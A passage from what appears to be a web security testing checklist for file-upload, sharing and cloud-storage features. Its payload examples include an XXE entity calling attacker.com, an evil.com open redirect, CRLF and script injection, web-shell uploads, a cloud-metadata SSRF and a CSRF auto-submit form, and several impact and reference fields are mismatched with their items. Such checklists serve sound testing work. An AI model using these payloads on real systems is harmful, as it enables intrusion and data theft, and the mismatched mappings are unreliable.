**Test Category:** WSTG-BUSL-08 / Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Storage Quota Management

**Test Steps:** 1. If shared folders exist upload large files to shared space 2. Check whose quota is consumed 3. Try to exhaust other users quota via shared uploads 4. Verify quota isolation

**Expected Result:** Application must clearly attribute shared storage and prevent quota abuse across users

**Payload Example:**

```
Upload large files to shared folder checking if it depletes other members quota
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / cURL

**References:** CWE-840; PortSwigger Business logic

---

## FILE-113 — Quota Display Mismatch
**Test Category:** WSTG-INFO-05 / Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Storage Quota Management

**Test Steps:** 1. Compare displayed quota with actual enforced quota 2. Check for integer overflow in quota display 3. Upload files and verify displayed usage accuracy 4. Look for discrepancies after deletions

**Expected Result:** Application must accurately display quota usage and handle edge cases correctly

**Payload Example:**

```
Upload 2GB file when quota shows 1GB remaining and check for integer overflow
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Browser DevTools / cURL

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## FILE-114 — File Upload via PUT Method
**Test Category:** WSTG-CONF-06 / HTTP Methods · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Single / Multiple File Upload

**Test Steps:** 1. Send PUT request to upload directory with file content 2. Try MOVE and COPY WebDAV methods 3. Test OPTIONS to discover allowed methods 4. Upload via alternative HTTP methods

**Expected Result:** Application must disable unnecessary HTTP methods on upload endpoints

**Payload Example:**

```
PUT /uploads/shell.php with body containing web shell or MOVE /tmp/shell.php /uploads/shell.php
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite / cURL / Nikto

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## FILE-115 — Upload via API Parameter Injection
**Test Category:** WSTG-INPV-01 / Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Single / Multiple File Upload

**Test Steps:** 1. Test all API parameters in upload endpoint 2. Inject into storage path parameter 3. Manipulate file destination parameter 4. Inject into file processing queue parameters

**Expected Result:** Application must validate and sanitize all parameters in upload API

**Payload Example:**

```
POST /api/upload {path: "/var/www/html/shell.php" filename: "safe.jpg"}
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / cURL

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## FILE-116 — Content-Disposition Header Injection
**Test Category:** WSTG-INPV-02 / Header Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Single / Multiple File Upload

**Test Steps:** 1. Inject CRLF characters in filename 2. Add additional headers via filename injection 3. Modify Content-Disposition to inline 4. Test for response splitting via filename

**Expected Result:** Application must sanitize filename in Content-Disposition and prevent header injection

**Payload Example:**

```
filename="test.jpg\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>"
```

**Impact:** CRLF/response-splitting -&gt; header injection, cache poisoning, session fixation.

**Tools:** Burp Suite / cURL

**References:** CWE-113; -&gt;[Host Header Injection checklist](#/checklist/hostheader); OWASP CRLF Injection; PortSwigger

---

## FILE-117 — Server-Side Template Injection via Image Metadata
**Test Category:** WSTG-INPV-18 / SSTI · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Image Cropping / Resizing

**Test Steps:** 1. Embed template syntax in image metadata 2. Upload and check if metadata is processed by template engine 3. Try {{7*7}} in EXIF fields 4. Monitor for template evaluation

**Expected Result:** Application must not pass image metadata through template engines

**Payload Example:**

```
exiftool -Artist='{{7*7}}' image.jpg or exiftool -Comment='${7*7}' image.jpg checking for 49 in output
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** ExifTool / Burp Suite / tplmap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## FILE-118 — LibTIFF Overflow via Crafted TIFF
**Test Category:** CVE-Based / Buffer Overflow · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Image Cropping / Resizing

**Test Steps:** 1. Create malformed TIFF with crafted strip sizes 2. Upload for processing 3. Monitor for crashes or memory corruption 4. Test multiple LibTIFF CVEs

**Expected Result:** Application must use updated image libraries and process images in sandboxed containers

**Payload Example:**

```
Crafted TIFF with oversized StripByteCounts or malformed IFD entries
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** AFL Fuzzer / Custom TIFF Scripts / GIMP

**References:** CWE-840; PortSwigger Business logic

---

## FILE-119 — Video File Format Fuzzing
**Test Category:** WSTG-INPV-01 / Fuzzing · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Video Upload &amp; Processing

**Test Steps:** 1. Generate malformed video files using fuzzing 2. Corrupt video headers and container structures 3. Upload fuzzed files 4. Monitor for crashes and unexpected behavior

**Expected Result:** Application must gracefully handle malformed video files without crashing

**Payload Example:**

```
Fuzzed MP4/AVI/MKV files with corrupted atoms/chunks/headers
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** AFL / Peach Fuzzer / Radamsa / zzuf

**References:** CWE-840; PortSwigger Business logic

---

## FILE-120 — OOXML External Entity via Custom XML
**Test Category:** WSTG-INPV-07 / XXE · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Document Preview

**Test Steps:** 1. Extract DOCX and add custom XML part with XXE 2. Modify customXml/item1.xml with entity declaration 3. Repack document 4. Upload for preview and check for entity resolution

**Expected Result:** Application must disable DTD processing in all XML parsers used for document handling

**Payload Example:**

```
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><root>&xxe;</root> in customXml
```

**Impact:** XXE -&gt; local file read / SSRF / OOB exfiltration.

**Tools:** Custom Python / Burp Collaborator / XXEinjector

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE

---

## FILE-121 — Subdomain Takeover on S3 Bucket
**Test Category:** WSTG-CONF-10 / Subdomain Takeover · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Cloud Storage Integration (S3 GCS)

**Test Steps:** 1. Identify CNAME records pointing to S3 buckets 2. Check if bucket exists 3. If bucket deleted claim the bucket name 4. Serve malicious content from claimed bucket

**Expected Result:** Application must maintain S3 bucket lifecycle and remove orphaned DNS records

**Payload Example:**

```
dig files.target.com CNAME showing target-files.s3.amazonaws.com then claiming the bucket
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** dig / subjack / can-i-take-over-xyz / AWS CLI

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## FILE-122 — Signed URL Parameter Tampering
**Test Category:** WSTG-ATHZ-04 / Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Cloud Storage Integration (S3 GCS)

**Test Steps:** 1. Capture signed cloud storage URL 2. Modify the key/path parameter 3. Modify expiration timestamp 4. Test with modified response-content-type parameter

**Expected Result:** Application must validate all signed URL parameters and reject tampered URLs

**Payload Example:**

```
Modify X-Amz-Expires or change object key in signed URL while keeping signature
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / cURL / AWS CLI

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FILE-123 — Open Redirect via Share Link
**Test Category:** WSTG-CLNT-04 / Open Redirect · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** File Sharing / Public Links

**Test Steps:** 1. Create share link with redirect parameter 2. Modify redirect URL to external site 3. Send crafted link to victim 4. Check if application redirects without validation

**Expected Result:** Application must validate redirect URLs and restrict to same-origin or whitelist

**Payload Example:**

```
/share/abc123?redirect=https://evil.com/phishing or /share/abc123?next=//evil.com
```

**Impact:** Open redirect -&gt; OAuth code/token theft, credible phishing on the trusted origin.

**Tools:** Burp Suite / cURL / Browser

**References:** CWE-601; -&gt;[Open Redirect checklist](#/checklist/openredir); PortSwigger; PayloadsAllTheThings

---

## FILE-124 — Symlink Extraction from Archive
**Test Category:** WSTG-INPV-05 / Path Traversal · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Bulk Upload / Download

**Test Steps:** 1. Create archive containing symbolic links to sensitive files 2. Include symlink to /etc/passwd or /etc/shadow 3. Upload and extract 4. Download extracted symlink target content

**Expected Result:** Application must detect and reject symlinks within uploaded archives

**Payload Example:**

```
tar czf evil.tar.gz symlink_to_etc_passwd (symlink -> /etc/passwd)
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** tar / ln -s / Custom Scripts / Burp Suite

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## FILE-125 — Server-Side Extension Processing Bypass
**Test Category:** WSTG-CONF-03 / Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** File Type Validation

**Test Steps:** 1. Upload .htaccess file to add PHP handler for .jpg 2. Upload .user.ini with auto_prepend_file 3. Upload web.config for IIS 4. Check if server config files are accepted

**Expected Result:** Application must block upload of server configuration files (.htaccess .user.ini web.config)

**Payload Example:**

```
Upload .htaccess with AddType application/x-httpd-php .jpg then upload shell.jpg
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite / cURL / Nikto

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## FILE-126 — Integer Overflow in Quota Calculation
**Test Category:** WSTG-INPV-01 / Input Validation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Storage Quota Management

**Test Steps:** 1. Upload file causing quota usage to approach integer max 2. Check for integer overflow in quota tracking 3. Verify 32-bit vs 64-bit storage calculations 4. Test with files near 2GB/4GB boundaries

**Expected Result:** Application must use appropriate data types for quota calculations and check for overflows

**Payload Example:**

```
Upload files to push total near 2147483647 bytes (INT_MAX) and observe quota behavior
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite / Custom Scripts / cURL

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## FILE-127 — Multipart Form Data Boundary Manipulation
**Test Category:** WSTG-INPV-01 / Input Validation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Single / Multiple File Upload

**Test Steps:** 1. Modify multipart boundary string 2. Use extremely long boundary 3. Nest multipart boundaries 4. Use conflicting boundary declarations

**Expected Result:** Application must properly parse multipart data and handle malformed boundaries

**Payload Example:**

```
Content-Type: multipart/form-data; boundary=AAAA(repeated 10000 times) or nested boundaries
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite / cURL / Custom Scripts

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## FILE-128 — File Upload Cross-Site Request Forgery
**Test Category:** WSTG-SESS-05 / CSRF · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Single / Multiple File Upload

**Test Steps:** 1. Create page with auto-submitting upload form 2. Target the upload endpoint from external origin 3. Check for CSRF token on upload endpoint 4. Test multipart CSRF

**Expected Result:** Application must require valid CSRF token for all upload operations

**Payload Example:**

```
<form action="https://target.com/upload" method="POST" enctype="multipart/form-data"><input type="file" name="f"><script>document.forms[0].submit()</script>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite / Custom HTML / CSRF PoC Generator

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## FILE-129 — File Upload Information Disclosure via Error
**Test Category:** WSTG-ERRH-01 / Error Handling · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Single / Multiple File Upload

**Test Steps:** 1. Upload file with invalid format 2. Upload to non-existent directory 3. Trigger processing errors 4. Check error messages for path disclosure or stack traces

**Expected Result:** Application must return generic error messages without revealing internal paths or technology

**Payload Example:**

```
Upload corrupt file and check for stack trace showing /var/www/html/uploads/ or library versions
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / cURL

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## FILE-130 — PDF SSRF via FormCalc
**Test Category:** WSTG-INPV-19 / SSRF · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Document Preview

**Test Steps:** 1. Create PDF with FormCalc script 2. Include URL() function targeting internal resources 3. Upload PDF 4. Check if server-side rendering triggers SSRF

**Expected Result:** Application must strip FormCalc scripts from PDFs or prevent server-side execution

**Payload Example:**

```
PDF with FormCalc: var response = Post("http://169.254.169.254/latest/meta-data/")
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Adobe Acrobat / Custom PDF / Burp Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## FILE-131 — Drag and Drop File Type Bypass
**Test Category:** WSTG-CLNT-01 / Client-Side Controls · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Drag &amp; Drop Upload

**Test Steps:** 1. Drop disallowed file type on upload zone 2. Check if client-side validation triggers 3. Intercept and forward if blocked client-side 4. Verify server-side validation

**Expected Result:** Application must validate file types server-side regardless of client drag-drop restrictions

**Payload Example:**

```
Drop .exe file bypassing JavaScript type check by intercepting XMLHttpRequest
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## FILE-132 — Insecure S3 Transfer Acceleration
**Test Category:** WSTG-CRYP-01 / Transport Security · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Cloud Storage Integration (S3 GCS)

**Test Steps:** 1. Check if S3 transfer acceleration is enabled 2. Verify if HTTPS is enforced 3. Test for HTTP downgrade on upload 4. Check for mixed content issues

**Expected Result:** Application must enforce HTTPS for all cloud storage transfers

**Payload Example:**

```
http://bucket.s3-accelerate.amazonaws.com/upload vs https:// and check for redirect
```

**Impact:** Credentials/tokens over cleartext -&gt; network interception -&gt; account takeover.

**Tools:** Burp Suite / cURL / SSLscan

**References:** CWE-319; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-01

---

## FILE-133 — Directory Listing via Folder API
**Test Category:** WSTG-CONF-04 / Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Folder Organization

**Test Steps:** 1. Call folder listing API without authentication 2. List root folder contents 3. Enumerate subfolders recursively 4. Check for sensitive files in folder listings

**Expected Result:** Application must require authentication and authorization for all folder listing operations

**Payload Example:**

```
GET /api/folders/root/contents without auth token or with expired token
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / cURL / Autorize

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## FILE-134 — Share Link Token in Referrer Header
**Test Category:** WSTG-INFO-05 / Information Leakage · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** File Sharing / Public Links

**Test Steps:** 1. Access shared link 2. Click external link from shared page 3. Check Referrer header for share token leakage 4. Verify Referrer-Policy header

**Expected Result:** Application must set Referrer-Policy: no-referrer or strip tokens from URLs before external navigation

**Payload Example:**

```
Access /share/secret-token then click external link and check if token leaks in Referer header
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Browser DevTools / Wireshark

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## FILE-135 — Upload Endpoint Authentication Bypass
**Test Category:** WSTG-ATHN-04 / Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Single / Multiple File Upload

**Test Steps:** 1. Access upload endpoint without authentication 2. Test with expired session token 3. Try with forged or empty JWT 4. Check if pre-signed upload URLs work without auth

**Expected Result:** Application must require valid authentication for all upload operations

**Payload Example:**

```
POST /api/upload without Authorization header or with invalid/expired token
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / cURL / jwt_tool

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## FILE-136 — Bulk Download Response Injection
**Test Category:** WSTG-INPV-02 / Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Bulk Upload / Download

**Test Steps:** 1. Check bulk download archive generation 2. Inject malicious filenames into download manifest 3. Check for archive header injection 4. Test for response splitting in download

**Expected Result:** Application must sanitize filenames when generating bulk download archives

**Payload Example:**

```
Include file with name containing CRLF or archive control characters in bulk download
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Custom Scripts / cURL

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## FILE-137 — Quota Reset Exploitation
**Test Category:** WSTG-BUSL-08 / Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Storage Quota Management

**Test Steps:** 1. Check if quota resets on account operations 2. Test quota behavior after plan downgrade/upgrade 3. Verify quota after file deletion 4. Check if soft-deleted files free quota

**Expected Result:** Application must properly track quota through all account lifecycle operations

**Payload Example:**

```
Delete all files then check if quota resets or if retention period affects available space
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / cURL / Account Management

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## FILE-138 — Video Thumbnail XSS
**Test Category:** WSTG-INPV-02 / XSS · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Video Upload &amp; Processing

**Test Steps:** 1. Upload video with XSS payload in metadata 2. Check if auto-generated thumbnail filename contains payload 3. Verify if thumbnail alt-text is sanitized 4. Test thumbnail page rendering

**Expected Result:** Application must sanitize all video metadata used in thumbnail display

**Payload Example:**

```
Video with title: <script>alert(1)</script> checking if thumbnail page reflects unsanitized title
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** ExifTool / Burp Suite / FFmpeg

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## FILE-139 — Version Diff Information Disclosure
**Test Category:** WSTG-INFO-05 / Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** File Versioning

**Test Steps:** 1. Access version diff/comparison endpoint 2. Compare versions of files across users 3. Check if diff reveals sensitive content 4. Test unauthorized diff access

**Expected Result:** Application must enforce authorization on version comparison operations

**Payload Example:**

```
GET /api/files/123/diff?v1=1&v2=2 as unauthorized user
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / cURL / Autorize

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## FILE-140 — Folder Move/Rename Authorization Bypass
**Test Category:** WSTG-ATHZ-02 / Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Folder Organization

**Test Steps:** 1. Move folder to restricted parent directory 2. Rename folder to override existing restricted folder 3. Move other users folder 4. Nest folders to bypass permission inheritance

**Expected Result:** Application must verify authorization for both source and destination in move operations

**Payload Example:**

```
PUT /api/folders/123/move {destination: "/admin/restricted/"} as regular user
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / cURL / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FILE-141 — Server-Side Encryption Misconfiguration
**Test Category:** WSTG-CRYP-03 / Encryption · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Cloud Storage Integration (S3 GCS)

**Test Steps:** 1. Upload file and check if server-side encryption is applied 2. Verify encryption type (SSE-S3 SSE-KMS SSE-C) 3. Check if encryption is enforced via bucket policy 4. Test accessing unencrypted objects

**Expected Result:** Application must enforce server-side encryption on all stored objects

**Payload Example:**

```
aws s3api head-object --bucket target --key file.pdf checking for ServerSideEncryption header
```

**Impact:** Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass.

**Tools:** AWS CLI / S3 Browser / CloudSploit

**References:** CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP

---

## FILE-142 — File Upload WAF Bypass Techniques
**Test Category:** WSTG-INPV-01 / WAF Bypass · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Single / Multiple File Upload

**Test Steps:** 1. Fragment malicious content across multipart chunks 2. Use transfer-encoding chunked 3. Add garbage padding to payload 4. Use alternative encodings for payloads

**Expected Result:** Application must detect malicious uploads regardless of encoding or chunking

**Payload Example:**

```
Chunked transfer with PHP shell split across chunks or UTF-16 encoded web shell
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / WAFNinja / Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---

## FILE-143 — Malicious Font Exploitation in Documents
**Test Category:** WSTG-INPV-02 / Code Execution · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Document Preview

**Test Steps:** 1. Create document with embedded malicious fonts 2. Craft font tables targeting known parser vulnerabilities 3. Upload document for preview 4. Monitor for crashes or code execution

**Expected Result:** Application must use updated font parsing libraries and sandbox document rendering

**Payload Example:**

```
DOCX/PDF with crafted OpenType/TrueType font exploiting parser vulnerabilities
```

**Impact:** Code/command execution -&gt; full server compromise.

**Tools:** FontForge / Custom Font Tools / Burp Suite

**References:** CWE-94; -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger; OWASP

---

## FILE-144 — Rate Limiting Absence on Share Access
**Test Category:** WSTG-ATHN-03 / Brute Force · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** File Sharing / Public Links

**Test Steps:** 1. Send rapid requests to share link endpoint 2. Test different token values without delay 3. Check for CAPTCHA or lockout mechanism 4. Measure response time differences

**Expected Result:** Application must implement rate limiting and exponential backoff on share link access

**Payload Example:**

```
Send 1000 requests/second to /share/{random_token} and check for throttling
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite Intruder / Hydra / Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## FILE-145 — Insecure Deserialization via File Upload
**Test Category:** WSTG-INPV-11 / Deserialization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Single / Multiple File Upload

**Test Steps:** 1. Upload serialized object file (.ser .pickle .yaml) 2. Craft malicious serialized payload 3. Check if application deserializes uploaded content 4. Monitor for RCE

**Expected Result:** Application must never deserialize uploaded file content or use safe deserialization

**Payload Example:**

```
Upload malicious Python pickle or Java serialized object targeting processing pipeline
```

**Impact:** Insecure deserialization -&gt; remote code execution.

**Tools:** ysoserial / Custom Pickle / Burp Suite

**References:** CWE-502; -&gt;[Insecure Deserialization checklist](#/checklist/deser); Bechler 'Java Unmarshaller Security'; ysoserial

---
